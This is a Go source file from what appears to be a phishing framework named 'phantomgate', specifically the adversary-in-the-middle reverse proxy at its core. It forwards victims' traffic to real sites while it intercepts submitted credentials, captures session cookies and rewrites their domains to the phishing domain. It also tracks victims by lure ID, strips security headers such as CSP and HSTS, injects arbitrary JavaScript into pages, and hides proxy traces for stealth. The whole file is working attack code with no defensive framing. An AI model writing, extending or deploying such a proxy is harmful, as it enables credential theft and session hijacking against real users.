package proxy

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"time"

	"github.com/phantomgate/phantomgate/internal/capture"
	"github.com/phantomgate/phantomgate/internal/config"
	"github.com/phantomgate/phantomgate/internal/lure"
	"github.com/phantomgate/phantomgate/internal/phishlet"
	"github.com/phantomgate/phantomgate/internal/store"
)

// PhantomProxy is the core transparent reverse proxy engine
type PhantomProxy struct {
	config      *config.Config
	phishlet    *phishlet.Phishlet
	store       *store.Store
	lureGen     *lure.Generator
	credSniff   *capture.CredentialInterceptor
	sessSniff   *capture.SessionHijacker
	phishDomain string
	hostMap     map[string]string // phish_host → real_host
	hostSSL     map[string]bool   // phish_host → is_ssl
	customTLS   *tls.Config       // optional CA-based dynamic TLS
}

// NewPhantomProxy creates a new AiTM reverse proxy
func NewPhantomProxy(cfg *config.Config, p *phishlet.Phishlet, s *store.Store, lg *lure.Generator) *PhantomProxy {
	hostSSL := make(map[string]bool)
	for _, h := range p.ProxyHosts {
		phishHost := h.PhishSub + "." + cfg.Domain
		hostSSL[phishHost] = h.IsSSL
	}
	pp := &PhantomProxy{
		config:      cfg,
		phishlet:    p,
		store:       s,
		lureGen:     lg,
		credSniff:   capture.NewCredentialInterceptor(s, p),
		sessSniff:   capture.NewSessionHijacker(s, p),
		phishDomain: cfg.Domain,
		hostMap:     p.GetHostMappings(cfg.Domain),
		hostSSL:     hostSSL,
	}
	return pp
}

// ServeHTTP handles every incoming request through the MITM proxy
func (pp *PhantomProxy) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	realHost, ok := pp.hostMap[req.Host]
	if !ok {
		hostNoPort := strings.Split(req.Host, ":")[0]
		realHost, ok = pp.hostMap[hostNoPort]
		if !ok {
			http.Error(w, "Not Found", 404)
			return
		}
	}

	// Track lure hits
	if lureID := req.URL.Query().Get("_lid"); lureID != "" {
		pp.lureGen.Track(lureID)
	}

	victimID := pp.getOrSetVictimID(w, req)

	// Read body once, copy for both credential inspection and proxy forwarding
	// Limit body to 10MB to prevent OOM from oversized payloads
	const maxBodySize = 10 * 1024 * 1024
	var bodyBytes []byte
	if req.Body != nil {
		var err error
		bodyBytes, err = io.ReadAll(io.LimitReader(req.Body, maxBodySize))
		req.Body.Close()
		if err != nil {
			log.Printf("[!] Failed to read request body: %v", err)
		}
		req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	}

	// Inspect for credentials synchronously before forwarding
	if len(bodyBytes) > 0 {
		bodyCopy := make([]byte, len(bodyBytes))
		copy(bodyCopy, bodyBytes)
		pp.credSniff.InspectRequest(req, bodyCopy, victimID)
	}

	// Apply optional timing jitter
	if pp.config.Stealth.RandomizeTimings {
		pp.applyTimingJitter()
	}

	scheme := "https"
	hostKey := strings.Split(req.Host, ":")[0]
	if isSSL, ok := pp.hostSSL[req.Host]; ok && !isSSL {
		scheme = "http"
	} else if isSSL, ok := pp.hostSSL[hostKey]; ok && !isSSL {
		scheme = "http"
	}
	targetURL, _ := url.Parse(fmt.Sprintf("%s://%s", scheme, realHost))

	proxy := httputil.NewSingleHostReverseProxy(targetURL)

	proxy.Transport = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	originalDirector := proxy.Director
	proxy.Director = func(proxyReq *http.Request) {
		originalDirector(proxyReq)

		proxyReq.Host = realHost
		proxyReq.URL.Host = realHost
		proxyReq.URL.Scheme = scheme

		if pp.config.Stealth.RemoveProxyHeaders {
			proxyReq.Header.Del("X-Forwarded-For")
			proxyReq.Header.Del("X-Forwarded-Proto")
			proxyReq.Header.Del("X-Real-IP")
			proxyReq.Header.Del("Via")
		}

		if referer := proxyReq.Header.Get("Referer"); referer != "" {
			proxyReq.Header.Set("Referer", pp.rewriteURLToReal(referer))
		}
		if origin := proxyReq.Header.Get("Origin"); origin != "" {
			proxyReq.Header.Set("Origin", pp.rewriteURLToReal(origin))
		}

		log.Printf("[>] %s %s %s (Victim: %s -> Target: %s)",
			req.RemoteAddr, req.Method, req.URL.Path, victimID[:8], realHost)
	}

	proxy.ModifyResponse = func(resp *http.Response) error {
		pp.sessSniff.InspectResponse(resp, victimID)

		pp.rewriteResponse(resp)

		pp.rewriteCookieDomains(resp)

		if location := resp.Header.Get("Location"); location != "" {
			resp.Header.Set("Location", pp.rewriteURLToPhish(location))
		}

		resp.Header.Del("Content-Security-Policy")
		resp.Header.Del("Content-Security-Policy-Report-Only")
		resp.Header.Del("Strict-Transport-Security")
		resp.Header.Del("X-Frame-Options")
		resp.Header.Del("X-Content-Type-Options")
		resp.Header.Del("X-XSS-Protection")

		if pp.config.Stealth.SpoofServerHeader != "" {
			resp.Header.Set("Server", pp.config.Stealth.SpoofServerHeader)
		}

		return nil
	}

	proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Printf("[!] Proxy error: %v (target: %s%s)", err, realHost, r.URL.Path)
		http.Error(w, "Service Unavailable", http.StatusBadGateway)
	}

	proxy.ServeHTTP(w, req)
}

// rewriteResponse modifies the response body to replace real domain references
// with our phishing domain references, and injects JS if configured
func (pp *PhantomProxy) rewriteResponse(resp *http.Response) {
	contentType := resp.Header.Get("Content-Type")

	rewritable := false
	for _, mime := range []string{"text/html", "text/css", "application/javascript", "application/json", "text/javascript", "application/xml"} {
		if strings.Contains(contentType, mime) {
			rewritable = true
			break
		}
	}
	if !rewritable {
		return
	}

	var reader io.ReadCloser
	var err error

	switch resp.Header.Get("Content-Encoding") {
	case "gzip":
		reader, err = gzip.NewReader(resp.Body)
		if err != nil {
			return
		}
		defer reader.Close()
		resp.Header.Del("Content-Encoding")
	default:
		reader = resp.Body
	}

	body, err := io.ReadAll(io.LimitReader(reader, 50*1024*1024))
	if err != nil {
		return
	}
	resp.Body.Close()

	bodyStr := string(body)

	// Apply phishlet sub_filters
	for _, filter := range pp.phishlet.SubFilters {
		if len(filter.MimeTypes) > 0 {
			matched := false
			for _, mime := range filter.MimeTypes {
				if strings.Contains(contentType, mime) {
					matched = true
					break
				}
			}
			if !matched {
				continue
			}
		}

		search := filter.Search
		replace := strings.ReplaceAll(filter.Replace, "{phish_domain}", pp.phishDomain)
		bodyStr = strings.ReplaceAll(bodyStr, search, replace)
	}

	// Generic domain rewriting
	for phishHost, realHost := range pp.hostMap {
		bodyStr = strings.ReplaceAll(bodyStr, realHost, phishHost)
	}

	// Inject custom JavaScript if configured and this is HTML
	if pp.phishlet.JSInject != "" && strings.Contains(contentType, "text/html") {
		jsTag := "<script>" + pp.phishlet.JSInject + "</script>"
		if idx := strings.Index(bodyStr, "</body>"); idx != -1 {
			bodyStr = bodyStr[:idx] + jsTag + bodyStr[idx:]
		} else {
			bodyStr += jsTag
		}
	}

	resp.Body = io.NopCloser(strings.NewReader(bodyStr))
	resp.ContentLength = int64(len(bodyStr))
	resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyStr)))
}

// rewriteCookieDomains changes Set-Cookie domain attributes to our phishing domain
func (pp *PhantomProxy) rewriteCookieDomains(resp *http.Response) {
	cookies := resp.Cookies()
	if len(cookies) == 0 {
		return
	}

	resp.Header.Del("Set-Cookie")

	for _, cookie := range cookies {
		if cookie.Domain != "" {
			cookie.Domain = pp.phishDomain
		}
		cookie.SameSite = http.SameSiteLaxMode
		resp.Header.Add("Set-Cookie", cookie.String())
	}
}

func (pp *PhantomProxy) rewriteURLToPhish(rawURL string) string {
	for phishHost, realHost := range pp.hostMap {
		rawURL = strings.ReplaceAll(rawURL, realHost, phishHost)
	}
	return rawURL
}

func (pp *PhantomProxy) rewriteURLToReal(rawURL string) string {
	for phishHost, realHost := range pp.hostMap {
		rawURL = strings.ReplaceAll(rawURL, phishHost, realHost)
	}
	return rawURL
}

func (pp *PhantomProxy) getOrSetVictimID(w http.ResponseWriter, req *http.Request) string {
	if cookie, err := req.Cookie("_pg_vid"); err == nil && cookie.Value != "" {
		return cookie.Value
	}

	if lureID := req.URL.Query().Get("_lid"); lureID != "" {
		pp.setTrackingCookie(w, lureID)
		return lureID
	}

	b := make([]byte, 16)
	rand.Read(b)
	victimID := hex.EncodeToString(b)
	pp.setTrackingCookie(w, victimID)
	return victimID
}

func (pp *PhantomProxy) setTrackingCookie(w http.ResponseWriter, victimID string) {
	http.SetCookie(w, &http.Cookie{
		Name:     "_pg_vid",
		Value:    victimID,
		Path:     "/",
		HttpOnly: true,
		MaxAge:   86400 * 7,
	})
}

func (pp *PhantomProxy) applyTimingJitter() {
	n, err := rand.Int(rand.Reader, big.NewInt(50))
	if err != nil {
		return
	}
	time.Sleep(time.Duration(n.Int64()) * time.Millisecond)
}

// GetListenAddr returns the address the proxy should listen on
func (pp *PhantomProxy) GetListenAddr() string {
	return fmt.Sprintf("%s:%d", pp.config.ListenIP, pp.config.HTTPSPort)
}

// GetHTTPAddr returns the HTTP redirect listener address
func (pp *PhantomProxy) GetHTTPAddr() string {
	return fmt.Sprintf("%s:%d", pp.config.ListenIP, pp.config.HTTPPort)
}

// SetCustomTLS sets a CA-based TLS config (from PhantomCA) for dynamic cert generation
func (pp *PhantomProxy) SetCustomTLS(tlsCfg *tls.Config) {
	pp.customTLS = tlsCfg
}

// CreateTLSConfig generates a TLS configuration for the proxy listener
func (pp *PhantomProxy) CreateTLSConfig() (*tls.Config, error) {
	if pp.customTLS != nil {
		return pp.customTLS, nil
	}

	switch pp.config.TLS.Mode {
	case "manual":
		cert, err := tls.LoadX509KeyPair(pp.config.TLS.CertFile, pp.config.TLS.KeyFile)
		if err != nil {
			return nil, fmt.Errorf("failed to load TLS certificate: %w", err)
		}
		return &tls.Config{
			Certificates: []tls.Certificate{cert},
		}, nil
	case "self-signed":
		return pp.generateSelfSignedTLS()
	default:
		return pp.generateSelfSignedTLS()
	}
}

func (pp *PhantomProxy) generateSelfSignedTLS() (*tls.Config, error) {
	cert, err := generateSelfSignedCert(pp.phishDomain)
	if err != nil {
		return nil, err
	}
	return &tls.Config{
		Certificates: []tls.Certificate{cert},
	}, nil
}

func generateSelfSignedCert(domain string) (tls.Certificate, error) {
	privKey, err := generatePrivateKey()
	if err != nil {
		return tls.Certificate{}, err
	}

	certPEM, keyPEM, err := createSelfSignedCertPEM(privKey, domain)
	if err != nil {
		return tls.Certificate{}, err
	}

	return tls.X509KeyPair(certPEM, keyPEM)
}
